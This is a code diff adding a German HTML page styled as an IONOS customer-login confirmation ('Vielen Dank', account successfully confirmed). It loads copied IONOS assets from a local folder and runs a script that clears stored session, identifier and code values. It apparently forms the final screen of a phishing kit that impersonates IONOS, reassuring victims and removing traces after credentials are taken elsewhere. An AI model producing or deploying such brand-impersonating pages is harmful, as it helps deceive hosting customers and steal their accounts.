@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="de" data-exos-theme="ionos">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Login – Zugang zu Ihrem Kundenkonto</title>
+  <link rel="icon" type="image/png" sizes="32x32" href="ionos-assets/image/favicon-32px.png" />
+  <link rel="stylesheet" href="ionos-assets/style/exos.min.css" />
+  <link rel="stylesheet" href="ionos-assets/style/main.min.css" />
+  <style>
+    .page-content main {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .page-section {
+      width: 100%;
+    }
+
+    .page-section--short .page-section__block {
+      padding-right: 0 !important;
+      max-width: 520px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .page-footer {
+      margin-top: auto;
+    }
+
+    .done-body { text-align: center; padding: 48px 32px 40px; }
+    .done-icon {
+      width: 64px; height: 64px; margin: 0 auto 20px;
+      background: #e8f4ea; border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 32px; color: #1a7f37;
+    }
+    .done-title { font-size: 22px; font-weight: 700; color: #003d8f; margin: 0 0 12px; }
+    .done-text { font-size: 14px; color: #555; line-height: 1.6; margin: 0 0 24px; }
+    .done-link { color: #003d8f; font-weight: 600; text-decoration: none; }
+  </style>
+</head>
+<body style="min-height:100vh;display:flex;flex-direction:column;">
+  <div class="page-content" style="flex:1;display:flex;flex-direction:column;">
+    <div class="oao-navi-navigation oao-navi-light">
+      <div class="oao-navi-left">
+        <div class="oao-navi-application-name">
+          <a class="oao-navi-app-name" href="https://www.ionos.de/">
+            <span class="oao-navi-app-logo"></span>
+            <span>Login</span>
+          </a>
+        </div>
+      </div>
+    </div>
+    <main>
+      <section class="page-section page-section--default page-section--short page-section--align-center">
+        <div class="page-section__block">
+          <div class="sheet">
+            <section class="sheet__section sheet__section--default done-body">
+              <div class="done-icon" aria-hidden="true">✓</div>
+              <h1 class="done-title">Vielen Dank</h1>
+              <p class="done-text">
+                Ihr Konto wurde erfolgreich bestätigt.<br>
+                Sie können dieses Fenster jetzt schließen.
+              </p>
+              <a class="done-link" href="https://my.ionos.de/">Zum IONOS Kundenkonto</a>
+            </section>
+          </div>
+        </div>
+      </section>
+    </main>
+  </div>
+  <footer class="page-footer">
+    <div class="page-footer__block">
+      <section class="page-footer__section page-footer__section--last">
+        <div class="page-footer__section-item page-footer__section-item--align-center">
+          &copy; 2026 <a class="page-footer__link" href="https://www.ionos.de/unternehmen">IONOS SE</a>
+        </div>
+      </section>
+    </div>
+  </footer>
+  <script>
+    sessionStorage.removeItem("ionos_session");
+    sessionStorage.removeItem("ionos_identifier");
+    sessionStorage.removeItem("ionos_code");
+  </script>
+</body>
+</html>
